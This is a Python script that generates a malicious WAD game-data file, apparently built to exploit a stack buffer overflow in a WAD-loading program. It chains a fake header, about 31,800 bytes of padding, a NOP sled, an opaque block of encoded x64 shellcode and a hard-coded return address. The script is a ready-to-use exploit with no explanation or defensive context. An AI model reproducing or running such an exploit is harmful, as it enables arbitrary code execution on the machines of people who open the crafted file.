#!/usr/bin/python
# -*- coding: utf-8 -*-

from struct import * 

payload_len = 32800
nop_len = 1000
nop_sled = '\x90' * nop_len

#form file header
head =  "PWADx"
head += bytearray('\x00\x00\x00')
head += "xx"
head += bytearray('\x00\x00')


buf =  pack('<IIII', 0x48c93148, 0xffdde981, 0x8d48ffff, 0xffffef05)
buf += pack('<IIII', 0x07bb48ff, 0x82f86a20, 0x489dc56b, 0x48275831)
buf += pack('<IIII', 0xfffff82d, 0xfbf4e2ff, 0x721ce968, 0x079d0583)
buf += pack('<IIII', 0xc3a92b20, 0x51cc973b, 0xe72a5b68, 0x67cf4e23)
buf += pack('<IIII', 0x9aaae168, 0x27cf4e23, 0xd28ae168, 0x4d2aca23)
buf += pack('<IIII', 0x4bc9276a, 0xab5df423, 0x80840b1c, 0xc6dce547)
buf += pack('<IIII', 0x83b967e9, 0x557027aa, 0x09b03b61, 0x4516e539)
buf += pack('<IIII', 0x52f9221c, 0x071545e0, 0x07b06a20, 0x4ffab1ab)
buf += pack('<IIII', 0x09a8ba21, 0x8cd9dd23, 0x83b14a60, 0x4fcb26bb)
buf += pack('<IIII', 0x09b9a3df, 0x06d54d5f, 0x4bc927f6, 0xab5df423)
buf += pack('<IIII', 0x8f31ab61, 0x3f5cc42a, 0xce091fc0, 0x0fb98968)
buf += pack('<IIII', 0xf7295365, 0x8cd99db3, 0x83b14e60, 0x8cdca3bb)
buf += pack('<IIII', 0x09bc222c, 0x06d4d92b, 0x86732bf0, 0xd79c8de3)
buf += pack('<IIII', 0xdab93261, 0x46c79c35, 0xc3a12b78, 0xeb1e8d31)
buf += pack('<IIII', 0x7daa2b00, 0x5edc9d8b, 0x9073227a, 0xf8629282)
buf += pack('<IIII', 0x38b037df, 0x079dc56a, 0x82f86a20, 0x06104823)
buf += pack('<IIII', 0xc3f86a21, 0x6816f4d1, 0x392d95a7, 0x513f709b)
buf += pack('<IIII', 0x175ed061, 0xd26258d6, 0xaa3ce968, 0x0de1c357)
buf += pack('<IIII', 0xf71891a0, 0x14da7e6e, 0x82920552, 0xdd148432)
buf += pack('<IIII', 0xe39bbfdf, 0x62b3a607, 0x82f80f58, 0x009dc56b)

padding = 'A' * (payload_len - nop_len)

f = open("test.wad", "w")
f.write(head + padding + nop_sled + buf + pack('<Q',0x7ff632558514))